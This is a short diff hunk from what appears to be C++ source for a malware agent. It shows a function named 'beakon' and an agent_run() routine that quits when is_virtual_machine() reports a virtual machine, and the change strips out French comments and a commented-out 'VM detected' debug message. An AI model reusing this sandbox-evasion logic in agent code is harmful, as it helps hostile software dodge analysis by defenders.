@@ -42,10 +42,7 @@ string beakon(const string& data_res) {
 void agent_run() {
     setvbuf(stdout, NULL, _IONBF, 0);
 
-    // Utiliser la nouvelle fonction de détection
     if (is_virtual_machine()) {
-        // Optionnel: message de debug
-        // MessageBoxA(0, "VM detected - exiting", "Volchock", 0);
         return;
     }
 
